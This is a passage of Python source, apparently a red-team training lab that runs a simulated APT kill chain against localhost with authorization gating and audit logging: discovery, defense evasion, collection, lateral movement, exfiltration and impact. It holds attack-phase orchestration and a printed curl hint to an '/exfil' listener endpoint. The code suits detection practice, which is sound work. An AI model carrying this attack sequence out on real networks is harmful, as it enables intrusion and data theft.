    # Authorization gate
    # ------------------------------------------------------------------
    try:
        require_authorization(skip_flag=args.yes)
    except AuthError as exc:
        print(f"[x] {exc}", file=sys.stderr)
        return 77
    except RTAIError as exc:
        print(f"[x] {exc}", file=sys.stderr)
        return 77

    print("*" * 62)
    print("  08 APT LAB — Discovery · Lateral · Exfil · Impact (lab-only)")
    print(f"  listener : {args.host}:{args.port} (04-c2-detection-lab compatible)")
    print(f"  telemetry: {args.log}")
    print(f"  findings : {args.findings}")
    print(f"  jitter   : {args.jitter}  attested: {actor_from_env()}")
    print("*" * 62)

    # Resolve staging dir — temp-based, never user profile
    if args.staging_dir:
        staging_path = Path(args.staging_dir)
    else:
        staging_path = Path(tempfile.gettempdir()) / f"apt_lab_stage_{uuid.uuid4().hex[:8]}"

    # Stores
    try:
        store = JsonlStore(args.log)
        # touch file so empty run still creates log
        store.path.parent.mkdir(parents=True, exist_ok=True)
        if not store.path.exists():
            store.path.write_text("", encoding="utf-8")
    except Exception as exc:
        print(f"[x] cannot open log {args.log}: {exc}", file=sys.stderr)
        return 74

    audit_chain = AuditChain()  # uses RTAI_AUDIT_LOG or audit.log
    db_store: Optional[SqliteEventStore] = None
    if args.db:
        try:
            db_store = SqliteEventStore(args.db)
        except Exception as exc:
            print(f"[warn] SQLite mirror disabled: {exc}", file=sys.stderr)

    def mirror(event: str, payload: dict):
        if db_store is not None:
            try:
                db_store.emit(event, **payload)
            except Exception:
                pass

    # Overall run id
    run_id = uuid.uuid4().hex[:12]
    started = dt.datetime.now()
    all_events: List[Dict] = []

    try:
        audit_chain.record("apt_run_start", actor=actor_from_env(), run_id=run_id, host=args.host, port=args.port, log=str(args.log))
    except Exception:
        pass
    mirror("apt_run_start", {"run_id": run_id, "host": args.host, "port": args.port})
    print(f"[*] run_id={run_id} staging={staging_path}")

    # ------------------------------------------------------------------
    # Phase 1: Discovery — TA0007 (read-only enumeration, JSONL logged)
    # ------------------------------------------------------------------
    print("[*] phase 1/6 — Discovery (T1082/T1083/T1018/T1069, read-only)")
    try:
        discovery_events = run_discovery(staging_path, args.host)
        for ev in discovery_events:
            wrapped = {"event": "discovery", **ev, "run_id": run_id}
            try:
                store.append(wrapped)
            except Exception as exc:
                LOG.warning("discovery store append failed: %s", exc)
            mirror("discovery", wrapped)
            all_events.append(wrapped)
            try:
                audit_chain.record("discovery_sim", actor=actor_from_env(), technique=ev.get("technique",""), run_id=run_id)
            except Exception:
                pass
            LOG.info("discovery %s done count=%s", ev.get("technique"), ev.get("count", ev.get("resolved", "")))
        ok_msg = f"discovery complete ({len(discovery_events)} techniques, env/process/file/group enumerated — values redacted)"
        print(f"[+] {ok_msg}")
    except Exception as exc:
        print(f"[warn] discovery phase error (continuing report-only): {exc}", file=sys.stderr)
        try:
            audit_chain.record("discovery_error", actor=actor_from_env(), run_id=run_id, error=str(exc)[:120])
        except Exception:
            pass

    time.sleep(random.uniform(0.2, 0.6))

    # ------------------------------------------------------------------
    # Phase 2: Defense Evasion — TA0005 (early, as APT would)
    # ------------------------------------------------------------------
    print("[*] phase 2/6 — Defense Evasion (T1027/T1070/T1036)")
    try:
        evasion_events = simulate_defense_evasion(staging_path, store, audit_chain)
        for ev in evasion_events:
            ev["run_id"] = run_id
            mirror("defense_evasion", ev)
            all_events.append(ev)
        print(f"[+] defense evasion simulated ({len(evasion_events)} techniques)")
    except Exception as exc:
        print(f"[warn] evasion phase error: {exc}", file=sys.stderr)

    time.sleep(random.uniform(0.2, 0.5))

    # ------------------------------------------------------------------
    # Phase 3: Collection — TA0009 (dummy staging, 7z placeholder)
    # ------------------------------------------------------------------
    print("[*] phase 3/6 — Collection (T1005/T1074 dummy staging)")
    try:
        coll_event = simulate_collection(staging_path, store, audit_chain, num_dummy=args.dummy_files)
        coll_event["run_id"] = run_id
        mirror("collection", coll_event)
        all_events.append(coll_event)
        print(f"[+] collection staged ({coll_event['total_bytes']} bytes dummy)")
    except Exception as exc:
        print(f"[warn] collection phase error: {exc}", file=sys.stderr)

    time.sleep(random.uniform(0.2, 0.5))

    # ------------------------------------------------------------------
    # Phase 4: Lateral Movement — TA0008 (simulated PsExec/WMI/SMB to 127.0.0.1)
    # ------------------------------------------------------------------
    print("[*] phase 4/6 — Lateral Movement (T1021/T1550/T1080 -> 127.0.0.1, log only)")
    try:
        lateral_events = simulate_lateral_movement(args.host, args.port, store, audit_chain, jitter=args.jitter)
        for ev in lateral_events:
            ev["run_id"] = run_id
            mirror("lateral", ev)
            all_events.append(ev)
        print(f"[+] lateral simulation complete ({len(lateral_events)} methods, all blocked/logged)")
    except Exception as exc:
        print(f"[warn] lateral phase error: {exc}", file=sys.stderr)

    time.sleep(random.uniform(0.2, 0.6))

    # ------------------------------------------------------------------
    # Phase 5: Exfiltration — TA0010 (C2 POST + DNS TXT + cloud dead-drop)
    # ------------------------------------------------------------------
    print("[*] phase 5/6 — Exfiltration (T1041 POST to 127.0.0.1 + T1048 DNS/cloud)")
    try:
        exfil_events = simulate_exfiltration(args.host, args.port, staging_path, store, audit_chain)
        for ev in exfil_events:
            ev["run_id"] = run_id
            mirror("exfil", ev)
            all_events.append(ev)
        delivered = sum(1 for e in exfil_events if "delivered" in str(e.get("result","")))
        print(f"[+] exfil simulation complete ({len(exfil_events)} events, {delivered} delivered to listener, rest logged)")
        if delivered == 0:
            print(f"    [hint] start 04 listener: python listener.py --host 127.0.0.1 --port {args.port} --log beacons.jsonl")
    except Exception as exc:
        print(f"[warn] exfil phase error: {exc}", file=sys.stderr)

    time.sleep(random.uniform(0.2, 0.5))

    # ------------------------------------------------------------------
    # Phase 6: Impact — TA0040 (report-only)
    # ------------------------------------------------------------------
    print("[*] phase 6/6 — Impact (T1486/T1496 report-only)")
    try:
        impact_events = simulate_impact(store, audit_chain)
        for ev in impact_events:
            ev["run_id"] = run_id
            mirror("impact", ev)
            all_events.append(ev)
        print(f"[+] impact simulated ({len(impact_events)} report-only)")
    except Exception as exc:
        print(f"[warn] impact phase error: {exc}", file=sys.stderr)

    # ------------------------------------------------------------------
    # Findings bundle for 05 copilot + run summary
    # ------------------------------------------------------------------
    try:
        bundle = emit_findings_json(args.findings, all_events, host=args.host)
        print(f"[+] findings bundle -> {args.findings} ({bundle['stats']['total']} findings)")
        mirror("findings_emitted", {"path": args.findings, "total": bundle["stats"]["total"]})
    except Exception as exc:
        print(f"[warn] findings emit failed: {exc}", file=sys.stderr)
        bundle = None

    # Final audit and summary
    elapsed = (dt.datetime.now() - started).total_seconds()
    try:
        audit_chain.record("apt_run_complete", actor=actor_from_env(), run_id=run_id, elapsed=int(elapsed), events=len(all_events), findings=bundle["stats"]["total"] if bundle else 0)
    except Exception:
        pass
    mirror("apt_run_complete", {"run_id": run_id, "elapsed": elapsed, "events": len(all_events)})

    print("\n=== apt lab summary ===")
    print(f"run_id        : {run_id}  elapsed {elapsed:.1f}s")
    print(f"telemetry     : {args.log} ({len(all_events)} events)")
    print(f"findings      : {args.findings}")
    if staging_path.exists():
        try:
            staged_count = len(list(staging_path.iterdir()))
            print(f"staging dir   : {staging_path} ({staged_count} dummy files — safe to delete)")
        except Exception:
            print(f"staging dir   : {staging_path}")
    print(f"audit chain   : {audit_chain.path} (verify: AuditChain().verify())")
    print(f"listener hint : curl http://{args.host}:{args.port}/exfil or run 04/listener.py")
    print(f"report hint   : python ../05-pentest-report-copilot/copilot.py --nmap samples/sample-nmap.xml --company Lab --no-llm  + ingest {args.findings}")
    print("[*] SAFETY: no real lateral, no real exfil of user data, no encryption — all simulation/report-only.")

    # Cleanup hint — do not auto-delete staging so analyst can inspect/tune detections
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except RTAIError as exc:
        print(f"[x] {exc}", file=sys.stderr)
        raise SystemExit(exc.exit_code if hasattr(exc, "exit_code") else 70)
    except KeyboardInterrupt:
        print("\n[!] interrupted by operator", file=sys.stderr)
        raise SystemExit(70)

